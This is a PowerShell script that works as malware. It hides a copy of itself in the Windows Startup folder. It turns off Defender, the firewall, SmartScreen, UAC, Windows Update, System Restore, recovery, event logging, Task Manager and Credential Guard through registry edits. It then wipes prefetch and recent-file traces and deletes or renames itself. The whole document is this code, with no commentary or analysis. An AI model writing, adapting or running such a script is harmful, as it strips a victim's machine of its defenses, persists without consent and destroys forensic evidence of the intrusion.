$ErrorActionPreference = "SilentlyContinue"
$ScriptPath = $MyInvocation.MyCommand.Path
$ExePath = (Get-Process -Id $PID).Path
$FullPath = if ($ScriptPath) { $ScriptPath } else { $ExePath }
$startupPath = [System.Environment]::GetFolderPath("startup")
$startupPath = "$startupPath\"
function Invoke-SelfReplication {
    $replicated = [System.IO.Path]::Combine($startupPath, [System.IO.Path]::GetRandomFileName() + [System.IO.Path]::GetExtension($FullPath))
    if (-not (Test-Path ($startupPath + [System.IO.Path]::GetFileName($FullPath)))) {
        Set-Content -Path $replicated -Value (Get-Content -Path $FullPath -Raw)
        (Get-Item $replicated).Attributes = 'Hidden'
    }
}

function Invoke-SelfDestruction {
    Remove-Item -Path "HKCU:\Software\Classes\ms-settings\shell" -Recurse -Force
    Get-ChildItem -Path "$env:SystemRoot\Prefetch" -Filter "*POWERSHELL*.pf" | Remove-Item -Force
    $scriptName = [System.IO.Path]::GetFileNameWithoutExtension($FullPath)
    $prefetchFiles = Get-ChildItem -Path "$env:SystemRoot\Prefetch" -Filter "$scriptName*.pf"
    if ($prefetchFiles) {
        foreach ($file in $prefetchFiles) {
            Remove-Item -Path $file.FullName -Force
        }
    }
    $recentFiles = Get-ChildItem -Path "$env:APPDATA\Microsoft\Windows\Recent" | Where-Object { $_.LastWriteTime -ge ((Get-Date).AddDays(-1)) }
    if ($recentFiles) {
        foreach ($file in $recentFiles) {
            Remove-Item -Path $file.FullName -Recurse -Force
        }
    }
    if (-not (Test-Path ($startupPath + [System.IO.Path]::GetFileName($FullPath)))) {
        if ($ScriptPath) {
            Remove-Item -Path $FullPath -Force
        } else {
            Start-Process powershell.exe -ArgumentList "-NoProfile -Command `"Remove-Item -Path '$FullPath' -Force -ErrorAction SilentlyContinue`"" -WindowStyle Hidden
        }
    } else {
        Rename-Item $FullPath -NewName ([System.IO.Path]::GetRandomFileName() + [System.IO.Path]::GetExtension($FullPath)) -Force
    }
}
function Set-RegistryProperties {
    param ([string]$path,[hashtable]$properties)
    if (-not (Test-Path $path)) {
        New-Item -Path $path -Force | Out-Null
    }
    foreach ($key in $properties.Keys) {
        Set-ItemProperty -Path $path -Name $key -Value $properties[$key] -Type DWord -Force
    }
}
$baseKey = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"
$realTimeProtectionKey = "$baseKey\Real-Time Protection"
$firewallPath = "HKLM:\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy"
reagentc /disable
Set-RegistryProperties -path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.SystemToast.SecurityAndMaintenance" -properties @{"Enabled" = 0}
Set-RegistryProperties -path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications" -properties @{"DisableNotifications" = 1}
Set-RegistryProperties -path $baseKey -properties @{
    "DisableAntiSpyware" = 1
    "DisableApplicationGuard" = 1
    "DisableControlledFolderAccess" = 1
    "DisableCredentialGuard" = 1
    "DisableIntrusionPreventionSystem" = 1
    "DisableIOAVProtection" = 1
    "DisableRealtimeMonitoring" = 1
    "DisableRoutinelyTakingAction" = 1
    "DisableSpecialRunningModes" = 1
    "DisableTamperProtection" = 1
    "PUAProtection" = 0
    "ServiceKeepAlive" = 0
}
Set-RegistryProperties -path $realTimeProtectionKey -properties @{
    "DisableBehaviorMonitoring" = 1
    "DisableBlockAtFirstSeen" = 1
    "DisableCloudProtection" = 1
    "DisableOnAccessProtection" = 1
    "DisableScanOnRealtimeEnable" = 1
    "DisableScriptScanning" = 1
    "SubmitSamplesConsent" = 2
    "DisableNetworkProtection" = 1
}
Set-RegistryProperties -path "$firewallPath\DomainProfile" -properties @{"EnableFirewall" = 0; "DisableNotifications" = 1}
Set-RegistryProperties -path "$firewallPath\StandardProfile" -properties @{"EnableFirewall" = 0; "DisableNotifications" = 1}
Set-RegistryProperties -path "$firewallPath\PublicProfile" -properties @{"EnableFirewall" = 0; "DisableNotifications" = 1}
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -Value "Off" -Type String -Force
Set-RegistryProperties -path "HKCU:\SOFTWARE\Microsoft\Edge\SmartScreenEnabled" -properties @{"(Default)" = 0}
Set-RegistryProperties -path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\AppHost" -properties @{"EnableWebContentEvaluation" = 0}
Set-RegistryProperties -path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" -properties @{"NoAutoUpdate" = 1}
Set-RegistryProperties -path "HKLM:\SYSTEM\CurrentControlSet\Services\wuauserv" -properties @{"Start" = 4}
Set-RegistryProperties -path "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" -properties @{"DisableSR" = 1; "DisableConfig" = 1}
Set-RegistryProperties -path "HKLM:\SYSTEM\CurrentControlSet\Services\srservice" -properties @{"Start" = 4}
Set-RegistryProperties -path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -properties @{"DisableTaskMgr" = 1}
Set-RegistryProperties -path "HKCU:\Software\Policies\Microsoft\Windows\System" -properties @{"DisableCMD" = 1}
Set-RegistryProperties -path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server" -properties @{"fDenyTSConnections" = 1}
Set-RegistryProperties -path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -properties @{"EnableLUA" = 0}
Set-RegistryProperties -path "HKLM:\SYSTEM\CurrentControlSet\Services\wscsvc" -properties @{"Start" = 4}
Set-RegistryProperties -path "HKLM:\SOFTWARE\Microsoft\Windows\Windows Error Reporting" -properties @{"Disabled" = 1}
Set-RegistryProperties -path "HKLM:\SYSTEM\CurrentControlSet\Control\Remote Assistance" -properties @{"fAllowToGetHelp" = 0}
Set-RegistryProperties -path "HKLM:\SYSTEM\CurrentControlSet\Services\WaaSMedicSvc" -properties @{"Start" = 4}
Set-RegistryProperties -path "HKLM:\SYSTEM\CurrentControlSet\Services\BITS" -properties @{"Start" = 4}
Set-RegistryProperties -path "HKLM:\Software\Microsoft\Windows Script Host\Settings" -properties @{"Enabled" = 0}
Set-RegistryProperties -path "HKLM:\SYSTEM\CurrentControlSet\Services\EventLog" -properties @{"Start" = 4}
Set-RegistryProperties -path "HKLM:\SYSTEM\CurrentControlSet\Services\SecurityHealthService" -properties @{"Start" = 4}
Set-RegistryProperties -path "HKLM:\SYSTEM\CurrentControlSet\Services\WSearch" -properties @{"Start" = 4}
Set-RegistryProperties -path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\Maintenance" -properties @{"MaintenanceDisabled" = 1}
Set-RegistryProperties -path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\DeviceGuard" -properties @{"LsaCfgFlags" = 0}
Set-RegistryProperties -path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -properties @{"LsaCfgFlags" = 0}
Set-RegistryProperties -path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard" -properties @{"EnableVirtualizationBasedSecurity" = 0; "RequirePlatformSecurityFeatures" = 0; "HVCIMATRequired" = 0}
Set-RegistryProperties -path "HKLM:\SOFTWARE\Microsoft\Hvsi" -properties @{"Enabled" = 0}
Set-RegistryProperties -path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Windows Defender Exploit Guard" -properties @{"EnableExploitProtection" = 0}
Set-RegistryProperties -path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\DataCollection" -properties @{"AllowTelemetry" = 0}
Set-RegistryProperties -path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\OneDrive" -properties @{"DisableFileSyncNGSC" = 1}
Set-RegistryProperties -path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Windows Search" -properties @{"AllowCortana" = 0}
Invoke-SelfReplication
Invoke-SelfDestruction